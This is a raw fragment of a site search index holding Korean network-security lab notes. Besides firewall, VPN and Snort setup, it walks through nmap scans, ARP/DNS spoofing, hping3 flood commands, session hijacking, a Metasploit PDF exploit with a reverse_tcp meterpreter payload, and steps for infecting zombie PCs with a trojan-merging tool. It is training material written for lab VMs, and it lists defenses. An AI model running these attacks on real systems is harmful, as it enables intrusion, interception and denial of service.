그러한 절차.\n  PREROUTING : DNAT를 이용하여 패킷이 생길 때 사용\n  POSTROUTING : SNAT를 이용하여 패킷이 생길 때 사용\n  iptables -L\n   SNAT  Source의 IP주소를 변경하는 것, 내부 -\u0026gt; 외부   DNAT  Destination의 IP주소를 변경하는 것, 외부 -\u0026gt; 내부         명령어  firewall-cmd --[옵션]=[Firewalld Zone] --[add, remove 등의 명령어]-[interface]=[ens33] [ --permanent 영구히 사용]  버전확인 firewall-cmd --version  방화벽 실행여부 확인 firewall-cmd --state  방화벽 리로드 firewall-cmd  Zone 목록을 출력 firewall-cmd --get-zones  Zone 기본 존을 출력 firewall-cmd --get-default-zone  ** 활성화된 Zone을 출력** firewall-cmd --get-active-zones  사용 가능한 서비스/ 포트 목록을 출력 firewall-cmd --lost-all  public 존에 속한 사용 가능한 모든 서비스/ 포트 목록을 출력 firewall-cmd --zone=public --list-all  ftp 서비스 추가 firewall-cmd --add-service=ftp  ftp 서비스를 제거 firewall-cmd --remove-service=ftp  21 tcp 포트를 추가 firewall-cmd --add-port=21/tcp  21 tcp 포트를 제거 firewall-cmd --remove-port=21/tcp  trusted 존에 ftp 서비스를 추가 firewall-cmd --zone=trusted --add-service=ftp  시스템 재부팅 또는 방화벽 재시작 후에도 적용되도록 하려면 \u0026ndash;permanent 옵션 firewall-cmd --permanent --add-service=ftp  포트포워딩 설정 firewall-cmd --add-forward-port=port=1000:proto=tcp:toport=80:toaddr=10.10.10.10  커맨드 확인 firewalld-cmd --get-service  방화벽 사용 중 확인 firewall-cmd --list-service cat /etc/firewalld/zones/public.xml  Zone 영역확인 firewall-cmd --get-zones # 존 영역 확인 firewall-cmd --get-active-zones firewall-cmd --get-active-zones firewall-cmd --get-active-zones firewall-cmd --list-all-zones # 모든 존 영역 확인  방화벽 재시작 firewall-cmd --reload  포트추가 firewall-cmd --zone=public --add-port=9090/tcp  firewall-cmd \u0026ndash;zone=public \u0026ndash;add-icmp-block=redirect\n  룰 확인 firewall-cmd --direct --get-all-rules  룰 추가 firewall-cmd --direct --add-rule ipv4 filter INPUT 0 -p tcp --dport 9090 -j ACCEPT  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  firewall-cmd \u0026ndash;reload firewall-cmd \u0026ndash;permanent \u0026ndash;zone=external firewall-cmd \u0026ndash;add-forward-port-port=9090:proto=tcp:toport=9090:toaddr=10.10.10.20 firewall-cmd \u0026ndash;set-default-zone=external firewall-cmd \u0026ndash;zone=internal \u0026ndash;add-masquerade\n firewall-cmd \u0026ndash;r\nSTART\nOK\nENG\nASIA\nSEOUL\nDEFALUT\nINTERFACE ( 순서 )\niP설정\nSTART\nYES\nYES\n윈도우가서 로그인\n초기설정\n웹방화벽기능 이메이방어기능\n네트워크 설정\n인터페이스 앤 라우팅 -\u0026gt; 설정\n기본이 거부 출발지\n목적지\n기타 등등\n드러그앤 드랍\n네트워크 인터페이스\n뉴 인터페이스\nnew DNG 서버에 맞게 아이피 설정 규칙에 맞게 설정\nDMZ 영역\n DMZ란? 외부의 불특정 호스트들과 직접 상호작용하는 공개 웹서버, 외부 DNS 서버 등을 배치하고 방화벽 바깥의 비 보안 영역과 방화벽 내부의 보안 영역 사이에 완충적인 영역으로 구성  내부에서 DMZ 통신 가능 외부에서 DMZ 통신 가능 DMZ에서 외부 통신 가능 DMZ에서 내부 통신 불가능 서비스를 제공하는 서버들이 외부의 불특정 호스트들과 통신하면서 서버가 바이러스나 악성코드에 의해서 감염이 되었을 때 내부에 있는 호스트들에게는 피해를 주지 않기 위해서 설정  SOPHOS 설정 내부 -\u0026gt; DMZ (웹, SSH, DNS 허용) 내부 -\u0026gt; 외부 (모두 허용) DMZ -\u0026gt; 내부 (모두 거부) DMZ -\u0026gt; 외부 (DNS만 허용) 외부 -\u0026gt; 내부 (모두 거부) 외부 -\u0026gt; DMZ (웹 서비스, DNS만 허용)   VPN 이란? Virtual Private Network, 가상 사설망이라고 한다. 특정 네트워크 대역끼리 사설 네트워크를 만들어서 연결할 때 하나하나 실제 네트워크 선을 연결해서 만들어야 하지만 현실적으로 비용이 많이 들고 물리적인 보안에 취약\n따라서 그 대신에 인터넷 네트워크 상으로 통신할 때 암호화 기술을 이용하여 특정한 사용자만 알아볼 수 있는 방식으로 통신\n    VPN 종류 2계층 : PPTP(MS에서 개발), L2TP(Cisco에서 개발) 3계층 : IPsec(IP 기반), IPv4, IPv6 모두 지원 IPsec의 모드 : AH(전송모드, 터널모드, 주로 인증) ESP(투명모드, 터널모드, 주로 암호화) *터널모드는 기존의 IP헤더를 암호화해서 감추고 새로운 IP헤더를 캡슐화한다. AH(인증 헤더) 기본 패킷 : [원본 IP 헤더][상위 헤더][Data]\n전송 모드 : [원본 IP 헤더][AH][상위 헤더][Data]\n터널 모드 : [새 IP 헤더][AH][원본IP 헤더][상위 헤더][Data]\n  ESP(암호화 헤더) 기본 패킷 : [원본 IP 헤더][상위 헤더][Data] 전송 모드 : [원본 IP 헤더][ESP][상위 헤더][Data][ESP Tail][ESP Auth] 터널 모드 : [새 IP 헤더][ESP][원본IP 헤더][상위 헤더][Data][ESP Tail][ESP Auth] 4계층 : SSL(Secure Socket Layer, TLS) SSL 프로토콜의 종류 Handshake : 암호화에 사용할 알고리즘을 서로 합의 Change Chiper Spec : 협상한 암호키 이용, 레코드 암호화 명령 Alert : 에러 메시지 전달 Record : 데이터 암호화 *네트워크 보안에서 SSL Strip, HeartBleed  VPN Remote Access 설정    UTM 설정\n  클라이언트 설정 크롬 설치\nSIC_V12.14_32.exe (베리즈에서 다운 후 윈도우 7에 설치)\n크롬에서 https://[UTM IP] 접속 -\u0026gt; 로그인 -\u0026gt; 원격 접속 -\u0026gt; 2번째 파일 다운 -\u0026gt; 패스워드 아무거나 입력 후 3번째 파일 다운\n  Site to Site VPN설정    UTM-1\n  UTM-2\n  설정파일 다운 로드 후 추가\n컨피규레이션 설티피케이트에 인증서 확인\nadd 클릭\nsophos_crt\nfrom PKCS#12 파일 선택\nOK\n프로필\n프로필 추가\n임포트 후 넥스트\n프로필 다시 들어가서 설정 변경\n아이덴티티\n프리쉐어드 키 none을 추가한 이증서로 바꾸기\nEMS 구축 (Enterprise Management System)   UTM 설정    원격 로그 서버 실습   서버 서버 /etc/rsyslog.conf 15번, 16번 라인에 주석 제거\nsystemctl restart rsyslog.service systemctl stop firewalld  클라이언트 /etc/rsyslog.conf 75번 라인에 다음 추가 *.notice\t@[서버 IP]\nsystemctl restart rsyslog.service  Snort Remote log vi /etc/snort/snort.conf\nsyslog 주석풀기\nvi /etc/rsys.conf\nSnort Remote log auth.alert @ [ 서버 IP ] 추가\n화이트 블럭 제출하기\nFirewalld\nfirewall-cmd \u0026ndash;get-log-denied off = 로그를 남기지 않는다\nfirewall-cmd \u0026ndash;set-log-denied=all all = 로그를 남긴다\nvi /etc/sysconfig/firewalld FIREWALLD_ARGS=[ \u0026ndash;debug ] 추가\nfirewall-cmd \u0026ndash;list-all firewall-cmd \u0026ndash;permanent \u0026ndash;zone=public \u0026ndash;add-icmp-block=echo-request firewall-cmd \u0026ndash;zone=public \u0026ndash;add-interface=ens33\nvi /etc/rsys.conf\nSnort Remote log kern.* @ [ 서버 IP ] 추가\n테스트 클라이언트에서 로그를 남기면 서버 쪽에서 확인 가능 logger -p local1.notice logging hahahahahahaha\n snort 설정\n  firewalld 설정\n  firewall-cmd --set-log-denied=[값] all, unicast, broadcast, multicast, off  아까 말한 시험 준비 말해드릴께여\n전에 얘기 했던 것 처럼 와이어 샤크 패킷 캡처 파일은 준 후 패킷이 캡쳐되어 있는 데, 누가 누구에게 무엇을 어떻게 했는 지를 파악해서\n누가 누구에게 ~ 를 했다를 쓰는 거에요\n아 컴퓨터 뻗었어\n누구에게 무엇을 했다\n누가 누구에게 무엇을 했다라는 소리는 무슨 아이피가 무슨 아이피에게 무엇을 했다라는 걸 말하는 거구요\n크리스마스 스캔 근거1. 포트르 바꿔가면서 보내는 거면 이런 아이피인 에가 포트를 바꿔가면서 뭐를 보냈다 근거2. 아이피도 바꾼걸로 바꿔서 디코이 공격도 같이 했다 대응책. 대응책을 세운 후, 적용 후 스크린샷을 찍어서 적용시킨다.\n이렇게 써서 보고서로 작성해서 제출하면 되요\n이제 다들 남은 시간동안 개인 공부하세요\n"});index.add({'id':151,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/%EB%B3%B4%EC%95%88/','title':"보안",'content':"Network Security   Hacking Process  확인 정보 ( OS 버전, 응용 프로그램, IP주소, 도메인 )  정보수집  \r정보 수집\r...\r\r  구글 검색    intitle : [검색어] - 탭 제목에 포함된 내용으로 검색\n  filetype : [검색어] - 특정 파일 확장자로 검색\n  site : [검색어] - 특정 도메인 주소 검색\n  inurl : [검색어] - URL에 포함된 문자 검색\n  홈페이지 이용\n    www.news.netcraft.com \u0026ndash;\u0026gt; Internet Data Mining \u0026ndash;\u0026gt; Hosting Provider Analysis\n  오른쪽에 정보를 수집하고 싶은 도메인 입력\n  서버의 OS 정보, 웹 서버 정보, IP 등 확인 가능\n  www.archive.org: 특정 도메인의 업데이트 내역 기록 ( 옛 사이트도 접속 가능 )\n  www.zone-h.org: 취약점이 존재하는 홈페이지 기록\n  www.shodan.io/: 특정 네트워크 장비, 네트워크를 찾음\n  \r\r\r  취약점 확인  \r네트워크 패킷을 이용한 해킹\r...\r\r네트워크 패킷을 이용한 해킹 포트 스캔을 이용한 정보수집\n 타깃이 서비스 중인 서비스를 파악하기 위해서 수행 ( ex:80번은 웹, 53번은 DNS, 23번은 텔넷, 22번은 ssh 등 ) 타깃이 특정 서비스를 실행중이라면 해당하는 서비스와 관련된 프로그램들의 취약점으로 공격 가능    TCP Open Scan   TCP 프로토콜의 3 Way-Handshake 과정에서 열려있는 포트에 TCP SYN 패킷을 보내면 SYN+ACK가 서버로부터 전달되고 닫혀있는 포트에 SYN 패킷을 보내면 RST+ACK가 서버로부터 전달된다. 이를 이용해서 확인하고 싶은 서비스의 포트로 SYN를 보내서 포트의 상태를 확인할 수 있다. Open Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기 때문에 타깃에게 해커의 정보가 남게된다. nmap -sT -p 1-100 [타깃IP]   TCP Half Scan   Half Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기않기 때문에 타깃에게 해커의 정보가 남지 않게 된다. nmap -sS -p 1-100 [타깃IP]   FIN Scan   열려있는 포트는 FIN 패킷을 받았을 때 아무 반응이 없고, 닫혀있는 포트는 RST+ACK로 응답한다. nmap -sF -p 1-100 [타깃IP]   X-mas Scan   어떤 플래그를 셋팅해서 스캔하는가? FIN+PSH+URG 포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X 포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답 nmap -sX -p 1-100 [타깃IP]   NULL Scan   어떤 플래그를 셋팅해서 스캔하는가? 플래그 사용 X 포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X 포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답 nmap -sN -p 1-100 [타깃IP]   UDP Scan   포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X 포트가 닫혀있을 때는 어떻게 동작하는가? ICMP Port Unreachable 패킷으로 응답 nmap -sU -p 1-100 [타깃IP]   Decoy Scan   스캔을 할 때 설정한 임의의 IP를 출발지IP로 설정해서 실제 해커의 IP와 섞어서 보내는 공격 nmap -sX -p 1-100 -D [임의의IP1],[임의의IP2] [타깃IP]   IDLE Scan   가자 IP로 위장해서 스캔 공격 nmap -sI [도메인] -p 1-100 [타깃IP] nmap -sI www.naver.com -p 1-100 [타깃IP] \r\r\r\r  취약점 확인 실습  \r스캔 실습\r...\r\r환경 준비\n  아무 OS( 타깃, nat, 네트워크 설정 ), Kali( 해커, nat )\n  kali, wireshark \u0026amp;\n  수동으로 스캔 telnet [타깃 IP] [포트]\n 접속되면 포트가 열림, 접속 안되면 포트가 닫힘    스캔 툴 nmap 이용 ( 위 참조 )\n    TCP Open Scan   Open Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기 때문에 타깃에게 해커의 정보가 남게된다.\n  nmap -sT -p 1-100 [타깃IP]\n    TCP Half Scan   Half Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기않기 때문에 타깃에게 해커의 정보가 남지 않게 된다.\n  nmap -sS -p 1-100 [타깃IP]\n    FIN Scan   열려있는 포트는 FIN 패킷을 받았을 때 아무 반응이 없고, 닫혀있는 포트는 RST+ACK로 응답한다.\n  nmap -sF -p 1-100 [타깃IP]\n    X-mas Scan   어떤 플래그를 셋팅해서 스캔하는가? FIN+PSH+URG\n  포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X\n  포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답\n  nmap -sX -p 1-100 [타깃IP]\n    NULL Scan   어떤 플래그를 셋팅해서 스캔하는가? 플래그 사용 X\n  포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X\n  포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답\n  nmap -sN -p 1-100 [타깃IP]\n    UDP Scan   포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X\n  포트가 닫혀있을 때는 어떻게 동작하는가? ICMP Port Unreachable 패킷으로 응답\n  nmap -sU -p 1-100 [타깃IP]\n    Decoy Scan   스캔을 할 때 설정한 임의의 IP를 출발지IP로 설정해서 실제 해커의 IP와 섞어서 보내는 공격\n  nmap -sX -p 1-100 -D [임의의IP1],[임의의IP2] [타깃IP]\n    IDLE Scan   가자 IP로 위장해서 스캔 공격\n  nmap -sI [도메인] -p 1-100 [타깃IP]\n  nmap -sI www.naver.com -p 1-100 [타깃IP]\n  정적 라우팅을 통해 차단이 가능\n  \r\r\r  관리자 권한 획득    스니핑과 스푸핑    스니핑: sniff라는 영어단어에서 유례한 말로, 상대방의 네트워크 패킷을 훔쳐보는 공격\n  스푸핑: 뭔가를 조작해서 속이는 공격\n  피싱\t: 남을 속여서 이득을 취하는 것, www.nevar.com\n  파밍\t: 남을 속여서 이득을 취하는 것, www.naver.com\n  스미싱 : 문자로 낚는 것\n     ARP 스푸핑을 이용한 스니핑\n  ARP 프로토콜은 IP주소를 이용해서 MAC주소를 알아오는 프로토콜이다. ARP 요청 패킷을 브로드 캐스트로 보내고 상대방에게 ARP 응답 패킷을 받으면 해당 내용을 ARP 테이블에 등록\n  이 때 응답 패킷을 받는 시스템에서는 어떤한 확인 절차도 수행하지 않고 응답 패킷의 내용을 ARP 테이블에 등록\n  만약 해커가 ARP 응답 프로토콜을 출발지 IP주소는 GW의 주소로 설정하고 출발지 MAC주소는 해커의 주소로 변경해서 응답 패킷을 보내면 해당 패킷을 받는 시스템은 GW와 통신을 할 때 해커에게 모든 패킷을 전달\n  dsniff 도구\n 각종 스니핑 기법들을 위한 자동화 도구, 단순한 도구라기 보다는 스니핑을 했을 때 필요한 추가적인 툴도 함께 들어있음  filesnarf\t: NFS를 이용해서 파일을 접근 또는 저장할 때 해당 파일을 해커의 디스크에 저장 urlsnarf\t: HTTP의 모든 URL을 기록 mailsnarf\t: SMTP, POP3 프로토콜로 통신하는 메일 송수신 내용을 기록 arpspoof\t: ARP 스푸핑 공격 dnsspoof\t: DNS 스푸핑 공격         ARP스푸핑  \rARP 스푸핑 실습\r...\r\r환경 준비\n  XP ( 타깃, NAT ), 칼리( 해커, NAT )\n  칼리 dsniff install\n  칼리 fragrouter install\n  공격\n    arpspoof -t [ 피해자 IP ] [ 피해자 GW의 IP ] 실행 (끄지 말 것)     fragrouter -B1 ( 종료 X )\n  GW를 고정하면 해결 가능\n  확인 : ARP -s [인터넷주소] [MAC 주소]\n  arp 스푸핑을 이용한 MITM 공격( Man in the Middle 공격, 중간자 공격 )을 통해 스니핑 가능\n  ifconfig [ eth0 ] promisc : 자기한테 오는 게 아니여도 버리지 않음\n  \r\r\r Telnet 스푸핑  \rTelnet 스푸핑\r...\r\rXP( 텔넷 클라이언트 )\nKail\nCentOS( 텔넷 서버 )\n yum install telnet-server systemctl restart telnet.socket netstat -anlp | grep :23  Telnet 스푸핑 프로세스   텔넷 클라이언트 cmd에서 telnet [ CentOS IP ]\n  arpspoof -t [ XP IP ] [ CentOS IP ]\n XP IP    arpspoof -t [ CentOS IP ] [ XP IP ]\n  fragrouter -B1\n  wireshark \u0026amp; ( 패킷 캡쳐시 promiscuous 모드 끄기 )\n  해결방법 : 방화벽, 공유기의 설정에서 ARP 보안 설정, ARP 테이블을 Static로 설정\n  \r\r\r   사이드 재킹  \r사이드 재킹\r...\r\rMITM 공격을 수행 중일 때 사용자의 인터넷 이용 기록(쿠키)을 기록하는 공격\nKail\n hamster 실행 ferret -i 1 실행 firefox   -\u0026gt; preferences -\u0026gt; Advanced -\u0026gt; network -\u0026gt; Settings -\u0026gt; Manual proxy configuration 체크, HTTP Proxy : localhost 포트 1234  ifconfig [ 네트워크 장치명 ] promisc\t설정  ifconfig [네트워크 장치명] -promisc\t해제    \r\r\r   ICMP Redirect 스니핑  \rICMP Redirect 스니핑\r...\r\rICMP의 Type 5번 패킷을 이용하여 타깃의 라우팅 테이블에 특정 라우팅 정보를 수정 또는 추가\n  hping3 -1 \u0026ndash;icmptype 5 \u0026ndash;icmpcode 1 -a [GW IP] \u0026ndash;icmp-ipdst [타깃→목적지IP] \u0026ndash;icmp-gw [해커IP] \u0026ndash;icmp-ipsrc [타깃 IP] [타깃 IP]\n  hping3 -1 \u0026ndash;icmptype 5 \u0026ndash;icmpcode 1 -a 192.168.240.2 \u0026ndash;icmp-ipdst 8.8.8.8 \u0026ndash;icmp-gw 192.168.240.200 \u0026ndash;icmp-ipsrc 192.168.240.10 192.168.240.10\n  XP : 192.168.240.10\n  칼리 : 192.168.240.200\n  GW : 192.168.240.2\n  \r\r\r   filesnarf  \rfilesnarf\r...\r\r**CentOS-1(파일 서버, NAT), CentOS-2(클라이언트, NAT), Kali(해커, NAT) ** nfs 공유 설정\n vi /etc/exports /test 192.168.240.*(rw,sync) systemctl restart nfs chmod 777 /[ 경로 ] mount -t nfs [서버IP]:[공유폴더] [마운트 포인트]  *nfs 버전이 높으면 안됨, centos7에서는 nfs버전이 기본으로 3이상이기 때문에 filesnarf가 파일을 저장하지 못한다.\n\r\r\r   urlsnarf  \rurlsnarf\r...\r\r 칼리에서 urlsnarf 실행 터미널 하나 더 띄워서 tcpkill -i eth0 -9 tcp 로 인터넷 안되게 하기 \r\r\r\r   DNS 스푸핑  \rDNS 스푸핑\r...\r\r  엉뚱한 웹 서버 만들기 Kali에서 /var/www/html에 있는 모든 파일을 지우고 index.html 파일 생성\n  DNS 스푸핑 Kali\n  dnsspoof 파일 생성\n  arp 스푸핑\n  dnsspoof -i eth0 -f /폴더 /dnsspoof //DNS 스푸핑 시작\n  cmd에서 www.naver.com 로 ping 테스트\n  밀린 세션 처리 : ipconfig /flushdns\n  그래도 안되면 해커가 응답을 주기 전에 8.8.8.8 dns 서버가 너무 빨리 응답을 주는 것 따라서 칼리에서 fragrouter -B1을 꺼주면 XP에서는 8.8.8.8과 통신이 안되기 때문에 dnsspoof 가능\n  \r\r\r   DoS\u0026amp; DDoS  \rDoS\u0026amp; DDoS\r...\r\rDoS ( Denial of Service ) : 서비스 거부 공격\nDDoS ( Distributed Denial of Service ) : 분산 서비스 거부 공격\nDoS\n **Ping Of Death **  ICMP 요청/응답 패킷을 이용, IP 헤더의 조각화를 이용해서 상대방에게 큰 데이터를 전송하는 ping 패킷을 여러 조각으로 나눠서 보내면 상대방은 해당 패킷을 다시 조립하는데 자원을 사용하게 된다. 이러한 패킷을 계속해서 보내면 패킷을 재조합하는데 시스템의 모든 자원을 사용하게 되고 시스템은 다운된다. hping3 \u0026ndash;icmp [타깃ip] -d 1000000 \u0026ndash;rand-source     Teardrop  패킷 조각화할 때 Fragment Offset 값을 중복 또는 공백이 생기도록 이상하게 만든다. 이런 이상한 패킷을 받은 상대방은 조각화된 패킷을 원래의 데이터로 조합을 할 때 에러를 발생시키게 되고 이러한 내용을 처리하기위해 시스템의 자원을 모두 사용해서 시스템이 다운된다. hping3 [xp IP] -a 1.1.1.1 \u0026ndash;id 3200 -M 34340 \u0026ndash;icmp \u0026ndash;flood -d 99999     Land Attack  패킷을 전달할 때 출발지 IP 주소를 타깃의 IP로 조작한 패킷을 타깃에게 전송 hping3 [타깃 IP] -a [타깃 IP] \u0026ndash;flood \u0026ndash;icmp     Smurf Attack  패킷을 전달할 때 출발지 IP를 타깃의 IP로 조작하고 브로드캐스트로 전송 hping3 [브로드캐스트] -a [타깃 IP] \u0026ndash;flood \u0026ndash;icmp     Syn Flooding  SYN 패킷을 무수히 많이 보내서 서버가 SYN_RECEIVED 상태로 ACK 패킷을 계속 기다리느라 모든 자원을 사용하게 하는 공격 hping3 [타깃 IP] -p 80 -S \u0026ndash;flood     UDP Flooding   무수히 많은 UDP 데이터 패킷을 보내서 상대방의 대역폭을 모두 잠식하는 공격\n  2 : UDP 사용\n  d : 데이터 크기\n  hping3 [타깃 IP] -2 \u0026ndash;flood \u0026ndash;rand-source -d 100 -p 80\n     DoS 방어법\n 방화벽 설정, Teardrop의 경우 조각화가 이상한 패킷은 그냥 Drop 시킨다. Land Attack의 경우 출발지 IP주소를 확인, 목적지 주소와 같거나 내부에 있는 IP가 들어오려는 경우 Drop 시킨다. Smurf Attack의 경우 브로드 캐스트 사용 X, IP와 MAC 주소를 매핑시켜서 등록된 MAC 주소만 사용되게 한다. Syn Flooding의 경우 time_out 시간을 짧게 설정해서 연결이 제대로 되지 않는 사용자는 바로바로 연결을 종료시킨다. UDP Flooding의 경우 사용하지 않는 포트나 UDP는 접근을 거부  DDoS\n  Mark5 - Service.exe -\u0026gt; 관리자 권한으로 실행 -\u0026gt; 추가 정보 -\u0026gt; 실행 -\u0026gt; 설치 -\u0026gt; 메시지 4개 success 확인\n  C:\\Windows\\SysWOW64 에 msconfupdate.dll 파일을 복사\t재부팅\n  좀비PC 감염시키는 법 ( 트로이목마 )\n   http://hsol.tistory.com/attachment/cfile26.uf@255A093D5201A6FA08EA20.7z PowerMerger를 이용하는 방법 PowerMerger는 2개의 실행 파일을 하나의 실행파일로 합치는 프로그램이다. 합쳐진 실행파일을 실행시키면\t%temp% 디렉토리에 원래의 실행파일들을 생성하고 두 개의 실행 파일 모두를 실행한다.  좀비PC 감염시키는 법 - 2 ( 드라이브 바이 다운로드 )   웹 브라우저의 취약점을 이용해서 특정 사이트를 접속하는 것만으로 악성코드가 다운로드되고 실행되서 감염까지되는 공격 https://www.exploit-db.com/\t각종 취약점을 테스트할 수 있는 코드 및 해킹 관련된 정보를 공유하는 사이트  \r\r\r   프로토콜 이용한 해킹  \r프로토콜을 이용한 해킹\r...\r\r  세션 하이재킹 실습\n칼리(해커)\tXP(서버, netcat) XP(클라이언트, netcat) cmd.exe nc.exe -lvp 1234\n cmd.exe\rnc.exe [서버 IP] 1234\r데이터 전송\r   hping3 ????????\nhping3 -a [서버 IP] [클라 IP] -s [S포트] -p [C포트] -M [마지막 통신 ACK번호] -R -A -c 1 = 끊낌\n세션 하이재킹 실습\n칼리(해커)\tCentOS(서버, telnet-server)\tXP(클라이언트, telnet) wget http://192.168.201.100:81/hunt-1.5bin.tgz tar zxvf hunt-1.5bin.tgz  ifconfig eth0 promisc\ncd hunt-1.5 ./hunt_static\nl\t//목록 보기\n yum install telnet-server\rsystemctl restart telnet.socket\rcmd\rtelnet [서버 IP]\r l\t//목록 보기 a\t//공격 0\t//타깃 지정 엔터X10 Ctrl + c 엔터X3\n최신 해킹 메타스플로잇 프레임워크\n Rapid 7에서 취약점에 대한 정리와 해당 취약점을 이용해서 공격 테스트를 할 수 있는 각종 도구들을 제공하는\t오픈소스로써 보안 취약점 및 침투 테스트 등에 대한 정보를 제공하는 것이 목적   메타스플로잇 용어   exploit\t: 시스템이나 어플리케이션, 서비스 등의 취약점을 이용하여 공격하는 공격 행위, 또는 명령어 Shell Code\t: 공격이 수행될 때 페이로드로 사용되어지는 코드, 어셈블리어(기계어)로 만들어진다. Payload\t: 타깃 PC에게 전달하는 정보, 쉘 코드나 다른 추가적인 정보를 담고 있다. Module\t: 메타스플로잇에서 사용되는 작은 프로그램들, 특정 기능들 ex) reverse_shell Listener\t: 메타스플로잇에서 사용되는 공격 중 원격 연결을 수행할 때 서버의 역할을 하는 시스템   메타스플로잇을 이용하는 방법\n 명령어를 이용하는 방법 msfconsole을 이용해서 대화식으로 이용하는 방법 ( msfconsole 명령어 실행 ) https://www.rapid7.com/db 에서 취약점 검색 정리 문서 보고 공격 PDF 문서 기반 공격 ( 공격 대상 : Window XP SP3, Adobe Reader 9.3.0 )    msfconsole\n  use exploit/windows/fileformat/adobe_libtiff\n  set payload windows/meterpreter/reverse_tcp\n  set LHOST [칼리IP]\n  show options\n  exploit\n  use exploit/multi/handler\n  set LHOST [칼리IP]\n  exploit\n  XP에서 PDF 실행\n  meterpreter 프롬프트가 되면\n  screenshot\n  shell\n  원격 조종 모듈  set payload windows/vncinject/reverse_tcp set VNCPORT 5500 set ViewOnly false exploit    SSL Strip SSL Strip\n  전송(4)계층 보안 프로토콜, TLS(과거 명칭, Transprot Layer Security) HTTP 통신을 암호화하는데 사용\n  MITM 공격을 수행하고 있을 때 해커와 타깃은 HTTP로 통신하고 정상적인 웹 서버와 해커는 HTTPS로 통신해서\t웹 서버는 비정상적인 패킷이라 판단 못하고 접속을 허용하게 되고 타깃은 비정상적인 통신을 수행한다.\n      \r\r\r "});index.add({'id':152,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/%EC%8B%9C%EC%8A%A4%ED%85%9C%ED%86%B5%ED%95%A9/','title':"시스템통합",'content':"시스템통합 관리 침입 탐지 시스템(IDS) \u0026ndash; Snort 이용    주된 기능\n  탐지(Detection)\n  잘못된 패킷을 감지하면 사용자에게 알림(주체적으로 처리하지 X, only 안내)\n       탐지 종류 2가지\n  (1)오용 탐지\t알고 있는 것 탐지\n  (2)이상 탐지\t모르는 것도 탐지(100% 탐지 X)\n  너무 민감하게 처리하면 필요한 정보도 차단하는 실수를 할 수 있음\n       설치위치 ( 성능이 달라짐 )\n  패킷이 라우터로 들어오기 전\n  내부 네트워크로 들어오는 모든 패킷은 IDS를 거침\n  쓸 데 없는 패킷을 많이 훑기 때문에 효율적이지 X\n (일반적으로 정상적인 패킷이 더 많기 때문)      라우터 뒤\n  라우터의 패킷 필터링을 거친 패킷을 검사\n  라우터 전보다는 성능저하 덜 함\n  but, 공격 패킷 탐지는 낮아질 수 있음\n    방화벽 뒤\n 일반적으로 2, 3, 4계층 패킷을 거름(5, 6, 7계층도 거름)    내부 네트워크\n  내부의 클라이언트를 신뢰할 수 없어 내부 네트워크 해킹을 감시하려 할 때 설치\n  내부 네트워크에 대한 해킹 피해를 방지하기 위해\n      Snort 설치 \rSnort 설치\r...\r\r 의존성 관련 프로그램 설치   - yum -y install http://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/d/daq-2.0.6-1.el7.x86_64.rpm - yum -y install gcc gcc-c++ flex bison zlib libpcap pcre libdnet tcpdump - yum -y install ftp://ftp.pbone.net/mirror/archive.fedoraproject.org/epel/7/x86_64/Packages/l/libnghttp2-1.31.1-1.el7.x86_64.rpm mkdir /[ doc ] cd /[ doc ]    wget http://ftp.psu.ac.th/pub/snort/libdnet-1.12.tgz\n  tar zxvf libdnet-1.12.tgz\n  cd libdnet-1.12\n  ./configure\n  make\n  make install\n               스노트 설치     Snort 다운로드\n  wget https://www.snort.org/downloads/snort/snort-2.9.16-1.centos7.x86_64.rpm\n  rpm -ivh snort\u0026hellip;.\n     스노트 기본 설정   /etc/snort/snort.conf 파일에서 기존의 룰 제거\n  253번 줄 맨 앞에 # 추가\n dynamicdetection directory /usr/local/lib/snort_dynamicrules \u0026ndash;\u0026gt; # dynamicdetection directory /usr/local/lib/snort_dynamicrules    511번, 512번 줄 맨 앞에 # 추가\n whitelist $WHITE_LIST_PATH/white_list.rules, \\ \u0026ndash;\u0026gt; # whitelist $WHITE_LIST_PATH/white_list.rules, \\ blacklist $BLACK_LIST_PATH/black_list.rules \u0026ndash;\u0026gt; # blacklist $BLACK_LIST_PATH/black_list.rules    548번, 651번 줄까지 맨 앞에 # 추가 or 삭제\n include \u0026hellip;\u0026hellip; \u0026ndash;\u0026gt; # include      cd /etc/snort/rules\n vi local.rules  alert icmp any any -\u0026gt; any any ( msg:\u0026ldquo;ICMP Detected\u0026rdquo;; sid:1000001; ) [액션][프로토콜][출발지IP][출발지포트]\t[목적지IP][목적지포트]\t[옵션]     snort 실행\n snort -c /etc/snort/snort.conf -i ens33    snort 실행확인\n  tail -f /var/log/snort/alert\n  *tip : snort.log로 시작하는 파일은 문서 파일이 아닌 실행 파일\n  snort 종료하면 나오는 보고서 형식으로 작성됨\n  snort -r 옵션으로 해당 파일을 볼 수 있음\n        \r\r\r Snort rules  \rSnort rules\r...\r\rRule  Rule 형태 : [RuleHeader] [tcp, udp, icmp, ip] [출발지IP] [포트] [-\u0026gt;, \u0026lt;\u0026gt;] [도착지IP] [포트] [RuleOption] - ex)alert icmp any any -\u0026gt; any any ( msg:\u0026quot;ICMP Detected\u0026quot;; sid:1000001; )  Rule Header    Rule Action\n  alert : 룰에 일치하는 경우 경고를 발생 시키고 로그로 기록한다.\n  log : 로그로 기록한다.\n  pass : 패킷을 무시한다.\n  drop : 패킷을 차단하고 로그로 남긴다.\n  reject : 패킷을 차단하고 로그로 남긴다, 그리고 tcp 패킷의 경우 rst 패킷을 응답하고 udp 패킷의 경우 icmp unreachable 패킷으로 응답한다.\n  sdrop : 패킷을 차단하고 로그를 